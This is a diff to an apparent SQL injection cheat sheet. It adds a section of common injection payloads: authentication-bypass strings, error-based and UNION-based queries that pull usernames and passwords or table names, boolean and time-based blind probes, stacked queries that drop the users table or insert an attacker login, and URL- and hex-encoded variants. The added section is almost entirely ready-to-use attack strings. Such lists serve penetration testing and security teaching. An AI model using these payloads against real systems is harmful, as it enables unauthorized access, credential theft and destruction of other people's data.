@@ -3,6 +3,7 @@
 
 • Data Queries
 • SQL injection Characters
+• Common SQL Injection Payload Examples
 
 
 -- Data Queries --
@@ -34,6 +35,46 @@
 | Space           | (space)          | `%20`                  |
 | Semicolon       | `;`              | `%3B`                  |
 | Dash            | `-`              | `%2D`                  |
+
+
+-- Common SQL Injection Payload Examples --
+
+🔸 Basic authentication bypass
+
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+admin' --
+
+🔸 Error-based injection
+
+1' AND 1=CONVERT(int, (SELECT @@version))--
+1' AND 1=CAST((SELECT user()) AS INT)--
+
+🔸 UNION-based injection
+
+' UNION SELECT null, username, password FROM users --
+' UNION SELECT 1, table_name, null FROM information_schema.tables --
+
+🔸 Boolean-based blind injection
+
+1' AND 1=1 --     (true)
+1' AND 1=2 --     (false)
+
+🔸 Time-based blind injection (MySQL)
+
+1' AND SLEEP(5) --
+' OR IF(1=1, SLEEP(5), 0) --
+
+🔸 Stacked queries (if supported)
+
+1'; DROP TABLE users; --
+1'; INSERT INTO logins VALUES ('attacker', 'pw'); --
+
+🔸 Encoded/obfuscated
+
+?id=1%27%20OR%20%271%27=%271%27--      (URL encoded)
+?id=0x31 OR 0x31=0x31 --               (Hex encoded)
 
 
 
